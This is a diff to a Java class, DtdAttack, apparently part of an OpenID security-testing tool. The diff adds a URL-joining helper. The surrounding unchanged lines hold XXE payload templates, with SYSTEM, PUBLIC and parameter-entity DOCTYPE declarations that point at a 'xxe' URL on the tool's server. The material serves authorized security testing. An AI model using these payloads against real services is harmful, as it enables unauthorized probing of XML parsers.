@@ -40,7 +40,12 @@ public class DtdAttack extends AbstractAttack {
     }
     
     public String addPathToUrl(String path, String url) {
-        return "";
+        // is the last character of url a slash?
+        if (url.substring(url.length() - 1).equals("/")) {
+            return url + path;
+        }
+        
+        return url + "/" + path;
     }
 
     @Override
@@ -76,7 +81,7 @@ public class DtdAttack extends AbstractAttack {
         String doctypeDeclaration = String.format(
                 "<!DOCTYPE XRDS [\n" +
                 "  <!ENTITY url '%s'>\n" +
-                "]>\n\n", urlIdp + "xxe");
+                "]>\n\n", addPathToUrl("xxe", urlIdp));
         
         String baseUrl = serverController.getConfig().getXrdsConfiguration().getBaseUrl();
         
@@ -111,7 +116,7 @@ public class DtdAttack extends AbstractAttack {
         String doctypeDeclaration = String.format(
                 "<!DOCTYPE XRDS [\n" +
                 "  <!ENTITY url SYSTEM '%s'>\n" +
-                "]>\n\n", urlIdp + "xxe");
+                "]>\n\n", addPathToUrl("xxe", urlIdp));
         
         String baseUrl = serverController.getConfig().getXrdsConfiguration().getBaseUrl();
         
@@ -146,7 +151,7 @@ public class DtdAttack extends AbstractAttack {
         String doctypeDeclaration = String.format(
                 "<!DOCTYPE XRDS [\n" +
                 "  <!ENTITY url PUBLIC 'm' '%s'>\n" +
-                "]>\n\n", urlIdp + "xxe");
+                "]>\n\n", addPathToUrl("xxe", urlIdp));
         
         String baseUrl = serverController.getConfig().getXrdsConfiguration().getBaseUrl();
         
@@ -217,7 +222,7 @@ public class DtdAttack extends AbstractAttack {
     private AttackResult performSystemParameterEntitesAllowed() {
         String doctypeDeclaration = 
                 "<!DOCTYPE XRDS [\n" +
-                "  <!ENTITY % dtd SYSTEM \"" + (urlIdp + "xxe") + "\">\n" +
+                "  <!ENTITY % dtd SYSTEM \"" + addPathToUrl("xxe", urlIdp) + "\">\n" +
                 "%dtd;]>\n\n";
     
         String baseUrl = serverController.getConfig().getXrdsConfiguration().getBaseUrl();
@@ -252,7 +257,7 @@ public class DtdAttack extends AbstractAttack {
     private AttackResult performPublicParameterEntitesAllowed() {
         String doctypeDeclaration = 
                 "<!DOCTYPE XRDS [\n" +
-                "  <!ENTITY % dtd PUBLIC 'm' \"" + (urlIdp + "xxe") + "\">\n" +
+                "  <!ENTITY % dtd PUBLIC 'm' \"" + addPathToUrl("xxe", urlIdp) + "\">\n" +
                 "%dtd;]>\n\n";
     
         
